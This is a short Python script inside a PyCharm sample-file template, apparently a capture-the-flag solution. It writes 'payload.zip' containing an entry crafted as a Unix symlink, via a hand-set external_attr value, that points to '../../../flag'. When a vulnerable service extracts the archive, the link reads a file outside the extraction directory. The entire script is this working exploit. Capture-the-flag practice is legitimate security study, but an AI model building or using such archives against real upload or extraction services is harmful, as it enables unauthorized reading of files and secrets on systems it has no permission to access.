# This is a sample Python script.

# Press ⌃R to execute it or replace it with your code.
# Press Double ⇧ to search everywhere for classes, files, tool windows, actions, and settings.


import zipfile


def compress_file(_filename):
    zipInfo = zipfile.ZipInfo(".")
    zipInfo.create_system = 3
    zipInfo.external_attr = 2716663808
    zipInfo.filename = _filename

    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(zipInfo, "../../../flag")


filename = 'evil_symlinkkk'
compress_file(filename)

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
